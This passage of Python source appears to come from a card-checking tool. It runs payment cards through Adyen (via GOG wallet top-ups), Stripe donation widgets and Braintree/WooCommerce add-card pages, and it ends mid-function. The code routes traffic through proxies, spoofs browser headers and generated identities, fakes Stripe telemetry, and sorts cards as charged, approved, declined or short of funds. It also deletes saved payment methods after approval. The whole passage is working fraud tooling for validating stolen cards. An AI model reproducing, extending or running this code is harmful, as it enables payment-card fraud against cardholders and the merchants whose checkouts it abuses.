def _fetch_adyen_public_key(
    adyen_token: str,
    adyen_url: str,
    gog_base: str,
    session: requests.Session,
) -> Optional[str]:
    """Fetch Adyen public key from securedFields page."""
    url = f"{adyen_url}/securedfields/{adyen_token}/5.5.1/securedFields.html"
    params = {
        "type": "card",
        "d": base64.b64encode(gog_base.encode()).decode(),
    }
    try:
        resp = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
        if resp.status_code != 200:
            return None
        match = re.search(r'10001\|[A-F0-9]+', resp.text)
        return match.group() if match else None
    except Exception as exc:
        logger.error(f"Failed to fetch Adyen public key: {exc}")
        return None


def _adyen_charge_flow(
    card_info: Dict,
    random_person: Dict,
    gateway_config: Dict,
) -> Tuple[str, str]:
    """Full Adyen Charge pipeline: GOG wallet top-up via Adyen CSE.

    Steps:
        1. Set cookies on session
        2. Get GOG access token
        3. Add funds to wallet (create checkout)
        4. Get cart token
        5. Get checkout details
        6. Select payment method (ccard)
        7. Get payment provider token
        8. Fetch Adyen public key
        9. Encrypt card data
        10. Submit payment
    """
    adyen_token = gateway_config.get("adyen_token")
    if not adyen_token:
        return ERROR, "Adyen token missing in gateway config"

    adyen_url = gateway_config.get("adyen_url")
    if not adyen_url:
        return ERROR, "Adyen URL missing in gateway config"

    gog_base = gateway_config.get("gog_base")
    gog_api = gateway_config.get("gog_api")
    if not gog_base or not gog_api:
        return ERROR, "GOG URLs missing in gateway config"

    cookies_list = gateway_config.get("cookies", [])
    if not cookies_list:
        return ERROR, "Cookies missing in gateway config"

    topup = 500  # $5 in cents
    currency = "USD"
    locale = "en-US"
    country_code = "DZ"

    proxies = _proxy_dict(gateway_config)
    session = requests.Session()
    adapter = HTTPAdapter(pool_maxsize=5)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    if proxies:
        session.proxies = proxies

    session.headers.update({
        "User-Agent": random_person["user_agent"],
        "Accept": "application/json, text/plain, */*",
        "Origin": gog_base,
        "Referer": f"{gog_base}/en/wallet",
    })

    # Apply cookies
    for c in cookies_list:
        name, value = c.get("name"), c.get("value")
        domain = c.get("domain", ".gog.com")
        if name and value:
            session.cookies.set(name, value, domain=domain)
    session.cookies.set("gog_lc", f"{country_code}_{currency}_{locale}", domain=".gog.com")
    session.cookies.set("csrf", "true", domain=".gog.com")
    session.cookies.set("checkout_ab", "new", domain=".gog.com")
    session.cookies.set("patron_visibility", "visible", domain=".gog.com")

    def _sync_locale():
        """Read the gog_lc cookie (GOG may overwrite it based on proxy IP geo)
        and update country_code / currency / locale to match the real order context."""
        nonlocal country_code, currency, locale
        gog_lc = session.cookies.get("gog_lc", domain=".gog.com") or ""
        parts = gog_lc.split("_", 2)
        if len(parts) == 3:
            country_code, currency, locale = parts[0], parts[1], parts[2]

    try:
        # ── Step 1: Get GOG access token ──
        resp = session.post(f"{gog_api}/user/accessToken.json", timeout=REQUEST_TIMEOUT)
        if resp.status_code != 200:
            return ERROR, "Failed to get GOG access token"
        _sync_locale()
        access_token = resp.json().get("accessToken")
        if not access_token:
            return ERROR, "GOG access token not found"
        auth_headers = {"Authorization": f"Bearer {access_token}"}

        # Freeze locale right after Step 1: GOG determined locale from proxy
        # geo-IP.  Lock it so every subsequent request uses the same context.
        checkout_country = country_code
        checkout_currency = currency
        checkout_locale = locale
        logger.debug(
            f"Adyen locale frozen: {checkout_country}_{checkout_currency}_{checkout_locale}"
        )

        def _force_locale():
            """Re-apply the frozen gog_lc cookie so GOG Set-Cookie headers can't desync it."""
            session.cookies.set(
                "gog_lc",
                f"{checkout_country}_{checkout_currency}_{checkout_locale}",
                domain=".gog.com",
            )

        # ── Step 2: Add funds to wallet ──
        _force_locale()
        resp = session.post(
            f"{gog_base}/wallet/funds",
            json={"amount": topup, "currency": checkout_currency},
            headers={"Content-Type": "application/json;charset=UTF-8"},
            timeout=REQUEST_TIMEOUT,
        )
        if resp.status_code != 200:
            return ERROR, "Failed to add funds to wallet"
        _force_locale()
        funds_data = resp.json()
        redirect_url = funds_data.get("redirectToUrl", "")
        checkout_id = redirect_url.split("/")[-1] if redirect_url else None
        if not checkout_id:
            return ERROR, "Failed to get checkout ID"

        # ── Step 3: Get cart token ──
        _force_locale()
        resp = session.get(f"{gog_base}/cartToken.json", timeout=REQUEST_TIMEOUT)
        if resp.status_code != 200:
            return ERROR, "Failed to get cart token"
        _force_locale()
        cart_token = resp.json().get("cartToken")
        if not cart_token:
            return ERROR, "Cart token not found"

        # ── Step 4: Get checkout details ──
        _force_locale()
        params = {
            "locale": checkout_locale,
            "countryCode": checkout_country,
            "currencyCode": checkout_currency,
            "cartToken": cart_token,
        }
        resp = session.get(
            f"{gog_api}/v1/checkout/{checkout_id}",
            params=params,
            headers=auth_headers,
            timeout=REQUEST_TIMEOUT,
        )
        if resp.status_code != 200:
            logger.error(f"Adyen Step 4: HTTP {resp.status_code} – {resp.text[:200]}")
            return ERROR, f"Checkout details HTTP {resp.status_code}"
        checkout_data = resp.json()
        checksum = checkout_data.get("checksum")

        # ── Step 5: Select payment method ──
        _force_locale()
        resp = session.post(
            f"{gog_api}/v1/checkout/{checkout_id}/payment-method",
            params={"locale": checkout_locale, "countryCode": checkout_country, "currencyCode": checkout_currency},
            json={"paymentMethodSlug": "ccard"},
            headers={**auth_headers, "Content-Type": "application/json"},
            timeout=REQUEST_TIMEOUT,
        )
        if resp.status_code != 200:
            return ERROR, "Failed to select payment method"

        # ── Step 6: Get payment provider token ──
        _force_locale()
        resp = session.post(
            f"{gog_api}/v1/checkout/{checkout_id}/payment-provider/bt/tokenize",
            params={"locale": checkout_locale, "countryCode": checkout_country, "currencyCode": checkout_currency},
            json={},
            headers={**auth_headers, "Content-Type": "application/json"},
            timeout=REQUEST_TIMEOUT,
        )
        if resp.status_code != 200:
            return ERROR, "Failed to get payment provider token"

        # ── Step 7: Fetch Adyen public key ──
        adyen_public_key = _fetch_adyen_public_key(adyen_token, adyen_url, gog_base, session)
        if not adyen_public_key:
            return ERROR, "Failed to fetch Adyen public key"

        # ── Step 8: Encrypt card data ──
        encrypted_card = _adyen_encrypt("number", card_info["number"], adyen_public_key)
        encrypted_month = _adyen_encrypt("expiryMonth", card_info["month"], adyen_public_key)
        encrypted_year = _adyen_encrypt("expiryYear", str(card_info["year"]), adyen_public_key)
        encrypted_cvv = _adyen_encrypt("cvc", card_info["cvv"], adyen_public_key)

        # ── Step 9: Submit payment ──
        payment_body = {
            "method": "ccard",
            "checksum": checksum,
            "gift": None,
            "issuer": {"useWalletFunds": False},
            "details": {
                "paymentMethod": {
                    "type": "scheme",
                    "holderName": "",
                    "encryptedCardNumber": encrypted_card,
                    "encryptedExpiryMonth": encrypted_month,
                    "encryptedExpiryYear": encrypted_year,
                    "encryptedSecurityCode": encrypted_cvv,
                }
            },
        }

        session.headers["Referer"] = f"{gog_base}/en/checkout/{checkout_id}"
        _force_locale()
        resp = session.post(
            f"{gog_api}/v1/checkout/{checkout_id}/payment",
            params={"locale": checkout_locale, "countryCode": checkout_country, "currencyCode": checkout_currency},
            json=payment_body,
            headers={**auth_headers, "Content-Type": "application/json"},
            timeout=REQUEST_TIMEOUT,
        )

        try:
            result = resp.json()
        except (json.JSONDecodeError, ValueError):
            return ERROR, f"Invalid response (HTTP {resp.status_code})"

        rtype = result.get("type", "")
        if rtype == "success":
            return CHARGE, "Successfully charged"
        if rtype == "redirect":
            return PASSAD, "Challenge Required (3DS)"

        # Error handling
        error_msg = result.get("message") or result.get("error", {}).get("message", "")
        if not error_msg:
            error_msg = (rtype or "Unknown").capitalize()

        lower_msg = error_msg.lower()
        if "insufficient" in lower_msg or "insufficient_funds" in lower_msg:
            return INSUFFICIENT_FUNDS, "Insufficient Funds"
        if "refused" in lower_msg or "declined" in lower_msg:
            return FAILED, error_msg
        if "expired" in lower_msg or "invalid" in lower_msg:
            return FAILED, error_msg

        return FAILED, error_msg

    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in adyen_charge_flow: {msg}")
            return ERROR, msg
        logger.error(f"Request error in adyen_charge_flow: {exc}")
        return ERROR, f"Request failed: {exc}"
    except Exception as exc:
        logger.error(f"Unexpected error in adyen_charge_flow: {exc}")
        return ERROR, f"Processing failed: {exc}"
    finally:
        try:
            session.close()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════
#  Stripe Charge – Widget Info
# ═══════════════════════════════════════════════════════

def get_stripe_charge_v1_info(
    apikey: str,
    widget_id: str,
    random_person: Dict,
    gateway_config: Dict,
) -> Dict[str, Any]:
    """Fetch PaymentIntent + ClientSecret + pk_live from the donation widget."""
    help_url = gateway_config["help_1_url"]
    url = f"https://api.{help_url}/v1/Widget/{widget_id}?ApiKey={apikey}"

    payload = {
        "ServedSecurely": True,
        "FormUrl": f"https://crm.{help_url}/HostedDonation?ApiKey={apikey}&WidgetId={widget_id}",
        "Logs": [],
    }

    headers = {
        "User-Agent": random_person["user_agent"],
        "Content-Type": "application/json; charset=UTF-8",
        "sec-ch-ua": '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-gpc": "1",
        "accept-language": "en-US,en;q=0.8",
        "origin": f"https://crm.{help_url}",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": f"https://crm.{help_url}/",
        "priority": "u=1, i",
    }

    result: Dict[str, Any] = {"PaymentIntentId": None, "ClientSecret": None, "pk_live": None}
    proxies = _proxy_dict(gateway_config)
    api_session = _build_api_session(proxies)

    try:
        resp = api_session.post(url, data=json.dumps(payload), headers=headers, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        data = resp.json()
        pe = data.get("PaymentElement", {})
        if pe:
            result["PaymentIntentId"] = pe.get("PaymentIntentId")
            result["ClientSecret"] = pe.get("ClientSecret")
            m = _RE_PK_LIVE_RAW.search(resp.text)
            if m:
                result["pk_live"] = m.group(0)
        return result
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in get_stripe_charge_v1_info: {msg}")
            result["proxy_error"] = msg
            return result
        logger.error(f"Stripe Charge widget request failed: {exc}")
        return result
    except Exception as exc:
        logger.error(f"Unexpected error in get_stripe_charge_v1_info: {exc}")
        return result
    finally:
        api_session.close()


# ═══════════════════════════════════════════════════════
#  Braintree Auth – Tokenize Card
# ═══════════════════════════════════════════════════════

_BT_TOKENIZE_QUERY = (
    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
    "{   tokenizeCreditCard(input: $input) {     token     creditCard "
    "{       bin       brandCode       last4       cardholderName "
    "      expirationMonth      expirationYear      binData "
    "{         prepaid         healthcare         debit         durbinRegulated "
    "        commercial         payroll         issuingBank         countryOfIssuance "
    "        productId       }     }   } }"
)

_BT_CONFIG_QUERY = (
    "query ClientConfiguration { clientConfiguration { analyticsUrl environment "
    "merchantId assetsUrl clientApiUrl creditCard { supportedCardBrands challenges "
    "threeDSecureEnabled threeDSecure { cardinalAuthenticationJWT } } applePayWeb "
    "{ countryCode currencyCode merchantIdentifier supportedCardBrands } paypal "
    "{ displayName clientId assetsUrl environment environmentNoNetwork unvettedMerchant "
    "braintreeClientId billingAgreementsEnabled merchantAccountId currencyCode payeeEmail } "
    "supportedFeatures } }"
)


def get_braintree_token(
    payload: Dict,
    card_info: Dict,
    random_person: Dict,
    access_token: str,
    gateway_config: Optional[Dict] = None,
) -> Tuple[Any, Any]:
    """Tokenize a credit card via Braintree GraphQL. Returns (token, brandCode)."""
    headers = {
        "Authorization": f"Bearer {access_token}",
        "braintree-version": "2018-05-10",
        "Content-Type": "application/json",
    }

    proxies = _proxy_dict(gateway_config) if gateway_config else None
    api_session = _build_api_session(proxies)

    try:
        resp = api_session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=payload,
            timeout=REQUEST_TIMEOUT,
        )
        resp.raise_for_status()
        data = resp.json()
        token_data = data.get("data", {}).get("tokenizeCreditCard")
        if not token_data:
            logger.error("Unexpected Braintree tokenize response structure")
            return None, None
        return token_data["token"], token_data["creditCard"]["brandCode"]
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in get_braintree_token: {msg}")
            return f"PROXY_ERROR:{msg}", None
        logger.error(f"Braintree tokenize request failed: {exc}")
        return None, None
    except Exception as exc:
        logger.error(f"Unexpected error in get_braintree_token: {exc}")
        return None, None
    finally:
        api_session.close()


def get_braintree_client_config(
    access_token: str,
    gateway_config: Optional[Dict] = None,
) -> Any:
    """Fetch Braintree ClientConfiguration (used by v3 payload)."""
    headers = {
        "Authorization": f"Bearer {access_token}",
        "braintree-version": "2018-05-10",
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"
        ),
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(_fake.uuid4()),
        },
        "query": _BT_CONFIG_QUERY,
        "operationName": "ClientConfiguration",
    }

    proxies = _proxy_dict(gateway_config) if gateway_config else None
    api_session = _build_api_session(proxies)

    try:
        resp = api_session.post(
            "https://payments.braintree-api.com/graphql",
            json=payload,
            headers=headers,
            timeout=15,
        )
        resp.raise_for_status()
        data = resp.json()
        cfg = data.get("data", {}).get("clientConfiguration")
        if not cfg:
            raise ValueError("Invalid Braintree ClientConfiguration response")
        return cfg
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in get_braintree_client_config: {msg}")
            return f"PROXY_ERROR:{msg}"
        logger.error(f"Braintree client config request failed: {exc}")
        return None
    except Exception as exc:
        logger.error(f"Unexpected error in get_braintree_client_config: {exc}")
        return None
    finally:
        api_session.close()


# ═══════════════════════════════════════════════════════
#  Payload Generation  (Braintree / Stripe Auth / Stripe Charge)
# ═══════════════════════════════════════════════════════

def _check_required_fields(gateway_config: Dict, fields: list) -> Optional[str]:
    """Return missing field name or None if all present."""
    for f in fields:
        if f not in gateway_config:
            return f
    return None


def _build_bt_tokenize_payload(card_info: Dict, random_person: Dict = None, include_billing: bool = False) -> Dict:
    """Build the Braintree TokenizeCreditCard mutation payload."""
    credit_card: Dict[str, Any] = {
        "number": card_info["number"],
        "expirationMonth": card_info["month"],
        "expirationYear": card_info["year"],
        "cvv": card_info["cvv"],
    }
    if include_billing and random_person:
        credit_card["billingAddress"] = {
            "postalCode": random_person["zipcode"],
            "streetAddress": "",
        }
    return {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": _fake.uuid4(),
        },
        "query": _BT_TOKENIZE_QUERY,
        "variables": {
            "input": {
                "creditCard": credit_card,
                "options": {"validate": False},
            }
        },
        "operationName": "TokenizeCreditCard",
    }


def _proxy_error_result(token_or_config) -> Optional[Tuple[bool, str, None]]:
    """If *token_or_config* is a PROXY_ERROR string, return error tuple."""
    if isinstance(token_or_config, str) and token_or_config.startswith("PROXY_ERROR:"):
        return False, token_or_config.replace("PROXY_ERROR:", ""), None
    return None


def generate_payload_payment(
    request_id: str,
    card_number: str,
    random_person: Dict,
    gateway_config: Dict,
    card_info: Dict,
    session: requests.Session,
) -> Tuple[bool, Any, Any]:
    """Build the final payment payload. Returns (ok, payload_or_error, info_url_or_None)."""
    secrets = extract_payment_config(request_id, card_number, random_person, gateway_config, session)

    if secrets.get("proxy_error"):
        return False, secrets["proxy_error"], None

    gw_type = gateway_config["gateway_type"]

    # ── Braintree Auth ────────────────────────────
    if "Braintree Auth" in gw_type:
        return _generate_braintree_payload(gateway_config, card_info, random_person, secrets)

    # ── Stripe Auth ───────────────────────────────
    if "Stripe Auth" in gw_type:
        return _generate_stripe_auth_payload(gateway_config, card_info, random_person, secrets)

    # ── Stripe Charge ─────────────────────────────
    if "Stripe Charge" in gw_type:
        return _generate_stripe_charge_payload(gateway_config, card_info, random_person, secrets)

    # ── Adyen Charge ──────────────────────────────
    if "Adyen Charge" in gw_type:
        return True, "adyen_charge_flow", None

    logger.error(f"Unsupported gateway type: {gw_type}")
    return False, f"Unsupported gateway type: {gw_type}", None


# ── Braintree payload builders ────────────────────

def _generate_braintree_payload(
    gateway_config: Dict,
    card_info: Dict,
    random_person: Dict,
    secrets: Dict,
) -> Tuple[bool, Any, Any]:
    """Build Braintree Auth v1 or v3 payload."""
    version = gateway_config.get("version", "")

    if "v1_with_cookies" in version:
        missing = _check_required_fields(
            gateway_config, ["cookies", "url", "access_token", "success_message", "error_message", "post_url"]
        )
        if missing:
            return False, f"{missing} is missing in gateway config", None

        nonce = secrets.get("nonce")
        if not nonce:
            return False, "Failed to fetch nonce", None

        bt_payload = _build_bt_tokenize_payload(card_info, include_billing=False)
        token, brand_code = get_braintree_token(
            bt_payload, card_info, random_person, gateway_config["access_token"], gateway_config
        )
        err = _proxy_error_result(token)
        if err:
            return err
        if not token or not brand_code:
            return False, "Failed to fetch token or brand code", None

        payload = {
            "payment_method": "braintree_credit_card",
            "wc-braintree-credit-card-card-type": brand_code,
            "wc-braintree-credit-card-3d-secure-enabled": "",
            "wc-braintree-credit-card-3d-secure-verified": "",
            "wc-braintree-credit-card-3d-secure-order-total": "0.00",
            "wc_braintree_credit_card_payment_nonce": token,
            "wc_braintree_device_data": json.dumps({"correlation_id": str(_fake.uuid4())}),
            "wc-braintree-credit-card-tokenize-payment-method": "true",
            "woocommerce-add-payment-method-nonce": nonce,
            "_wp_http_referer": "/my-account/add-payment-method",
            "woocommerce_add_payment_method": "1",
        }
        return True, payload, None

    if "v3_with_cookies" in version:
        missing = _check_required_fields(
            gateway_config, ["cookies", "url", "access_token", "success_message", "error_message"]
        )
        if missing:
            return False, f"{missing} is missing in gateway config", None

        bt_payload = _build_bt_tokenize_payload(card_info, random_person, include_billing=True)
        token, brand_code = get_braintree_token(
            bt_payload, card_info, random_person, gateway_config["access_token"], gateway_config
        )
        err = _proxy_error_result(token)
        if err:
            return err
        if not token or not brand_code:
            return False, "Failed to fetch token or brand code", None

        client_cfg = get_braintree_client_config(gateway_config["access_token"], gateway_config)
        err = _proxy_error_result(client_cfg)
        if err:
            return err
        if not client_cfg:
            return False, "Failed to get Braintree client configuration", None

        nonce = secrets.get("nonce")
        if not nonce:
            return False, "Failed to fetch nonce", None

        config_data = {
            "environment": client_cfg["environment"],
            "clientApiUrl": client_cfg["clientApiUrl"],
            "assetsUrl": client_cfg["assetsUrl"],
            "merchantId": client_cfg["merchantId"],
            "analytics": {"url": client_cfg["analyticsUrl"]},
            "creditCards": {"supportedCardTypes": client_cfg["creditCard"]["supportedCardBrands"]},
            "challenges": client_cfg["creditCard"]["challenges"],
            "threeDSecureEnabled": client_cfg["creditCard"]["threeDSecureEnabled"],
            "paypal": client_cfg["paypal"],
            "applePayWeb": client_cfg["applePayWeb"],
        }

        payload = {
            "payment_method": "braintree_cc",
            "braintree_cc_nonce_key": token,
            "braintree_cc_device_data": json.dumps({
                "device_session_id": str(_fake.uuid4()),
                "correlation_id": str(_fake.uuid4()),
            }),
            "braintree_cc_config_data": json.dumps(config_data),
            "woocommerce-add-payment-method-nonce": nonce,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "woocommerce_add_payment_method": "1",
        }
        return True, payload, None

    return False, f"Unsupported Braintree version: {version}", None


# ── Stripe Auth payload builder ───────────────────

def _generate_stripe_auth_payload(
    gateway_config: Dict,
    card_info: Dict,
    random_person: Dict,
    secrets: Dict,
) -> Tuple[bool, Any, Any]:
    """Build Stripe Auth v1 payload."""
    version = gateway_config.get("version", "")

    if "v1_with_cookie" in version:
        missing = _check_required_fields(gateway_config, ["cookies", "url", "post_url"])
        if missing:
            return False, f"{missing} is missing in gateway config", None

        pk_live = secrets.get("pk_live")
        if not pk_live:
            return False, "Failed to fetch pk live", None

        account_id = secrets.get("accountId")
        if not account_id:
            return False, "Failed to fetch accountId", None

        email = secrets.get("email")
        if not email:
            return False, "Failed to fetch email", None

        payment_id = get_stripe_auth_id(
            random_person, card_info, pk_live, account_id, gateway_config["url"], gateway_config
        )

        err = _proxy_error_result(payment_id)
        if err:
            return err
        if not payment_id:
            return False, "Your card was rejected from the gateway", None

        ajax_nonce = secrets.get("createSetupIntentNonce")
        if not ajax_nonce:
            return False, "Failed to fetch ajax nonce", None

        payload = {
            "action": "create_setup_intent",
            "wcpay-payment-method": payment_id,
            "_ajax_nonce": ajax_nonce,
        }
        return True, payload, None

    if "v3_with_login" in version:
        # Login-based flow handles its own session and returns status directly
        return True, "v3_login_flow", None

    return False, f"Unsupported Stripe Auth version: {version}", None


# ── Stripe Charge payload builder ─────────────────

def _generate_stripe_charge_payload(
    gateway_config: Dict,
    card_info: Dict,
    random_person: Dict,
    secrets: Dict,
) -> Tuple[bool, Any, Any]:
    """Build Stripe Charge v1 payload."""
    version = gateway_config.get("version", "")

    if "v1_without_cookies" in version:
        missing = _check_required_fields(gateway_config, ["url", "post_url"])
        if missing:
            return False, f"{missing} is missing in gateway config", None

        api_key = secrets.get("ApiKey")
        if not api_key:
            return False, "Failed to fetch ApiKey", None

        widget_id = secrets.get("widgetId")
        if not widget_id:
            return False, "Failed to fetch widgetId", None

        payment_info = get_stripe_charge_v1_info(api_key, widget_id, random_person, gateway_config)

        if payment_info.get("proxy_error"):
            return False, payment_info["proxy_error"], None

        pi_id = payment_info.get("PaymentIntentId")
        if not pi_id:
            return False, "Failed to fetch PaymentIntentId", None

        client_secret = payment_info.get("ClientSecret")
        if not client_secret:
            return False, "Failed to fetch ClientSecret", None

        pk_live = payment_info.get("pk_live")
        if not pk_live:
            return False, "Failed to fetch pk_live", None

        help_url = gateway_config["help_1_url"]
        payload = {
            "return_url": f"https://crm.{help_url}/HostedDonation?ApiKey={api_key}&WidgetId={widget_id}",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": random_person["zipcode"],
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_info["number"],
            "payment_method_data[card][cvc]": card_info["cvv"],
            "payment_method_data[card][exp_year]": card_info["year"],
            "payment_method_data[card][exp_month]": card_info["month"],
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": (
                f"stripe.js/{random.randint(280000000, 290000000)}; "
                f"stripe-js-v3/{random.randint(280000000, 290000000)}; payment-element"
            ),
            "payment_method_data[referrer]": f"https://crm.{help_url}",
            "payment_method_data[time_on_page]": str(random.randint(120000, 240000)),
            "payment_method_data[client_attribution_metadata][client_session_id]": str(_fake.uuid4()),
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "standard",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
            "payment_method_data[client_attribution_metadata][elements_session_config_id]": str(_fake.uuid4()),
            "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]": "payment",
            "payment_method_data[guid]": str(_fake.uuid4()),
            "payment_method_data[muid]": str(_fake.uuid4()),
            "payment_method_data[sid]": str(_fake.uuid4()),
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": pk_live,
            "client_attribution_metadata[client_session_id]": str(_fake.uuid4()),
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "standard",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[elements_session_config_id]": str(_fake.uuid4()),
            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
            "client_secret": client_secret,
        }

        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        return True, payload, confirm_url

    return False, f"Unsupported Stripe Charge version: {version}", None


# ═══════════════════════════════════════════════════════
#  Post-Payment Helpers
# ═══════════════════════════════════════════════════════

def delete_payment_method(
    request_id: str,
    card_number: str,
    gateway_config: Dict,
    random_person: Dict,
    url: str,
    session: requests.Session,
) -> bool:
    """Delete a saved payment method from the merchant account page."""
    try:
        resp = session.post(url=url, allow_redirects=True, timeout=15)
        resp.raise_for_status()
        session.cookies.update(resp.cookies)

        tree = html.fromstring(resp.content)
        delete_links = tree.xpath(
            '//a[contains(concat(" ", normalize-space(@class), " "), " delete ")]/@href'
        )
        if not delete_links:
            logger.warning("No delete link found on account page")
            return False

        del_resp = session.post(url=delete_links[0], allow_redirects=True, timeout=15)
        del_resp.raise_for_status()
        return "Payment method deleted" in del_resp.text
    except Exception as exc:
        logger.error(f"delete_payment_method failed: {exc}")
        return False


def confirm_payment_intent(
    payload: Dict,
    confirm_url: str,
    random_person: Dict,
    gateway_config: Optional[Dict] = None,
) -> requests.Response:
    """Confirm a Stripe PaymentIntent (Charge flow)."""
    headers = {
        "User-Agent": random_person["user_agent"],
        "Accept": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
    }

    proxies = _proxy_dict(gateway_config) if gateway_config else None
    api_session = _build_api_session(proxies)

    try:
        return api_session.post(confirm_url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in confirm_payment_intent: {msg}")

            class _ProxyResp:
                content = json.dumps({"proxy_error": msg}).encode()
                text = json.dumps({"proxy_error": msg})
                status_code = 0

            return _ProxyResp()
        raise
    finally:
        api_session.close()


# ═══════════════════════════════════════════════════════
#  Response Parsing
# ═══════════════════════════════════════════════════════

def _parse_payment_response(
    request_id: str,
    card_number: str,
    content: bytes,
    random_person: Dict,
    gateway_config: Dict,
    session: requests.Session,
) -> Tuple[str, str]:
    """Interpret the gateway response (JSON or HTML) and return (status, message)."""
    try:
        # ── Try JSON first ──
        try:
            data = json.loads(content)

            if "proxy_error" in data:
                return ERROR, data["proxy_error"]

            # Stripe Charge succeeded
            if data.get("status") == "succeeded":
                return CHARGE, "Succeeded"

            # 3DS challenge required
            if data.get("status") == "requires_action":
                return PASSAD, "Challenge Required"

            # Generic JSON success
            if data.get("success") is True:
                return SUCCESS, "Approved"

            # ── Error handling ──
            error_message = "Unknown error"

            if "error" in data:
                err_obj = data["error"]
                error_message = err_obj.get("message", "Unknown error")
                decline_code = err_obj.get("decline_code")
                if decline_code:
                    if decline_code == "insufficient_funds":
                        return INSUFFICIENT_FUNDS, "Insufficient Funds"
                    error_message = f"{error_message} ({decline_code.replace('_', ' ').title()})"
            elif "data" in data and isinstance(data["data"], dict) and "error" in data["data"]:
                raw = data["data"]["error"].get("message", "Unknown error")
                error_message = raw.split("Error: ")[-1]

            return FAILED, error_message

        except (json.JSONDecodeError, ValueError):
            pass

        # ── HTML parsing ──
        tree = html.fromstring(content)
        parsed = urlparse(gateway_config["url"])
        origin = f"{parsed.scheme}://{parsed.netloc}"

        # Success check
        success_xpath = gateway_config.get("success_message", "")
        if success_xpath:
            success_nodes = tree.xpath(success_xpath)
            if success_nodes:
                message = "Approved"
                if not delete_payment_method(
                    request_id, card_number, gateway_config, random_person,
                    f"{origin}/my-account/payment-methods/", session,
                ):
                    message = "Approved (error delete)"
                return APPROVED, message

        # Error check
        error_xpath = gateway_config.get("error_message", "")
        if error_xpath:
            error_nodes = tree.xpath(error_xpath)
            if error_nodes:
                raw_msg = error_nodes[0].strip()
                m = _RE_ERROR_MSG.search(raw_msg)
                extracted = m.group(1) if m else raw_msg

                if "Duplicate card exists in the vault" in extracted:
                    extracted = "Approved old try again"
                    if not delete_payment_method(
                        request_id, card_number, gateway_config, random_person,
                        f"{origin}/my-account/payment-methods/", session,
                    ):
                        extracted = "Approved old try again (error delete)"
                    return APPROVED, extracted

                return DECLINED, extracted

        logger.warning("No success or error message found in response")
        return ERROR, "No success or error message found in response"

    except Exception as exc:
        logger.error(f"Response parsing failed: {exc}")
        return ERROR, f"Parsing failed: {exc}"


# ═══════════════════════════════════════════════════════
#  Main Payment Pipeline
# ═══════════════════════════════════════════════════════

def process_payment(
    request_id: str,
    gateway_config: Dict,
    card_info: Dict,
    random_person: Dict,
    session: requests.Session,
) -> Tuple[str, str]:
    """Orchestrate the full payment flow: payload → submit → parse response."""
    card_number = card_info["number"]

    # Self-contained flows: skip extract_payment_config (they manage their own sessions)
    gw_type = gateway_config.get("gateway_type", "")
    if "Adyen Charge" in gw_type:
        try:
            status, message = _adyen_charge_flow(card_info, random_person, gateway_config)
            return status, message
        finally:
            session_manager.cleanup_session(request_id)

    logger.info(f"🔧 [{request_id}] Generating payment payload...")
    t0 = time.time()
    ok, result, info = generate_payload_payment(
        request_id, card_number, random_person, gateway_config, card_info, session
    )
    logger.info(f"⏱️ [{request_id}] Payload generated in {time.time() - t0:.2f}s")

    if not ok:
        return ERROR, result

    payload = result

    try:
        # v3_with_login: self-contained login flow
        if payload == "v3_login_flow":
            status, message = _stripe_auth_login_flow(card_info, random_person, gateway_config)
            session_manager.cleanup_session(request_id)
            return status, message

        if "Stripe Charge" in gateway_config["gateway_type"] and "v1_without_cookies" in gateway_config.get("version", ""):
            response = confirm_payment_intent(payload, info, random_person, gateway_config)
        else:
            response = session.post(
                url=gateway_config["post_url"],
                data=payload,
                allow_redirects=True,
